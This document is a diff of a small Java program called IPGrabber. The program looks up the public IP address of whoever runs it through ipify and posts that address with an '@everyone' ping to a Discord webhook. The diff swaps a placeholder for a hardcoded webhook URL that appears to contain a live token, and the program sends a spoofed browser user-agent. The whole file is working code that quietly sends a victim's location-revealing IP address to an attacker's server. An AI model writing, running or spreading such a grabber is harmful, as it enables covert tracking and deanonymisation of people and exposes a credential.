@@ -1,36 +1,52 @@
-
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.net.HttpURLConnection;
+import java.net.URI;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 
-public class ipgrabber {
+public class IPGrabber {
 
 	public static void main(String[] args) {
 		try {
-            String ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine();
-            // I put it on one line because it saves a bit of space
-            // If you don't want it on one line the code below is how you do it.
-            /*
-            URL url = new URL("https://api.ipify.org/");
-            InputStreamReader isr = new InputStreamReader(url.openStream());
-            BufferedReader br = new BufferedReader(isr);
-            String ip = br.readLine();
-            */
+            URL url = new URI("https://api.ipify.org/").toURL();
+            HttpURLConnection con = (HttpURLConnection) url.openConnection();
+			
+			con.setRequestMethod("GET");
+
+			int responseCode = con.getResponseCode();
+			if (responseCode != 200) {
+				System.out.println("Failed to fetch page. Response code: " + responseCode);
+				return;
+			}
+
+			BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+			String inputLine;
+			StringBuilder htmlContent = new StringBuilder();
+
+            while ((inputLine = in.readLine()) != null) {
+				htmlContent.append(inputLine);
+			}
+			in.close();
+
+			int len = htmlContent.length();
+			String ip = htmlContent.substring(0, len);
+
             sendMessage("@everyone\n" + "> IP: " + ip);
         } catch(Exception e) {
         	e.printStackTrace();
         }
 	}
+
 	public static void sendMessage(String message) {
 	        PrintWriter out = null;
 	        BufferedReader in = null;
 	        StringBuilder result = new StringBuilder();
 	        try {
-	            URL realUrl = new URL("<webhook url>");
-	            URLConnection conn = realUrl.openConnection();
+	            URL url = new URI("https://discord.com/api/webhooks/876330874390597662/VgiIB_h98kVCkKW24CagWm0fQNP7k2IKZz7YR-BQTBZrxqw9EhzWBEdQzcEP5hsLxgzz").toURL();
+	            URLConnection conn = url.openConnection();
 	            conn.setRequestProperty("accept", "*/*");
 	            conn.setRequestProperty("connection", "Keep-Alive");
 	            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
